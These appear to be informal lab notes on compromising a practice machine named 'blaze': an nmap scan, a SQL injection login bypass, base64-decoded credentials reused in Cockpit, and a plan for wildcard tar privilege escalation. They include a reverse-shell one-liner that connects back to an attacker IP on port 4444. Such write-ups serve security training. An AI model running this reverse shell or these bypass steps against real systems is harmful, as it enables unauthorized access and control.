

**192.168.181.10**


```sh
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: blaze
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|     margin: 0 0 10px;
|_    @font-face {
| ssl-cert: Subject: commonName=blaze/organizationName=d2737565435f491e97f49bb5b34ba02e
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Issuer: commonName=blaze/organizationName=d2737565435f491e97f49bb5b34ba02e
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-14T14:37:17
| Not valid after:  2125-12-21T14:37:17
| MD5:   1774 e12b 1a2d 0ca5 ffbb 78c4 bbf3 3e67
|_SHA-1: 0878 fd56 7cd2 4148 e314 3ee9 75f8 7918 d018 3def
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.80%T=SSL%I=7%D=1/14%Time=6967AA5D%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,E45,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type:
SF:\x20text/html;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-DN
SF:S-Prefetch-Control:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Cont
SF:ent-Type-Options:\x20nosniff\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<
SF:head>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nd08\r\n</title
....

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


![[Pasted image 20260114154621.png]]


i tried some sqli

![[Pasted image 20260114154846.png]]


WTF the username and password was `a:a` ?
something is wrong 
use https://book.hacktricks.wiki/en/pentesting-web/login-bypass/sql-login-bypass.html



![[Pasted image 20260114165920.png]]


its basically only base64 encoded

![[Pasted image 20260114171830.png]]



i tried with ssh it didnt work then i saw that `cockpit ` is installed OBVIOUSLY 

so i tried the credentials for james and it worked 



![[Pasted image 20260114175241.png]]

i checked first what shell its using 
`echo $SHELL`

`sh -i >& /dev/tcp/192.168.45.178/4444 0>&1
`


![[Pasted image 20260114175527.png]]

we know there is a wild card tar to take advantage of that 

https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

![[Pasted image 20260114181110.png]]